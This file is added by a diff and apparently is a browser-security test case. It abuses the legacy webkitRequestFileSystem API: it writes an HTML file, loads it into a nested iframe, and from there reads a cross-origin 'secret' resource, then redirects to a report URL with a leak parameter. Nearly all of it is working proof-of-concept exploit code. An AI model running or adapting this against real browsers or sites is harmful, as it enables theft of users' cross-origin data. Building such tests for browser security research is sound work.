@@ -1,0 +1,22 @@
+<!doctype html>
+<iframe id="f" src="https://leak.test/custom/c1117687/main"></iframe>
+<script>
+f.onload = async function () {
+  var promisify = function promisify(func) {
+    return function () {
+      for (var _len = arguments.length, rest = Array(_len), _key = 0; _key < _len; _key++) {
+        rest[_key] = arguments[_key];
+      }
+
+      return new Promise(function (resolve, reject) {
+        return func.apply(undefined, rest.concat([resolve, reject]));
+      });
+    };
+  };
+  var fs = await promisify(webkitRequestFileSystem)(TEMPORARY, 2 ** 10);
+  var entry = await promisify(fs.root.getFile.bind(fs.root))('test', { create: true });
+  var writer = await promisify(entry.createWriter.bind(entry))();
+  writer.write(new Blob(["<!doctype html><script>var req = new XMLHttpRequest(); req.onreadystatechange = function () { if (this.readyState == 4 && this.status == 200) { document.location.href = 'https://adition.com/report/?leak=c1117687'; } }; req.open('GET', 'https://adition.com/custom/c1117687/secret', true); req.send();<\/script>"]));
+  f.contentWindow.frames[0].location = entry.toURL();
+};
+</script>
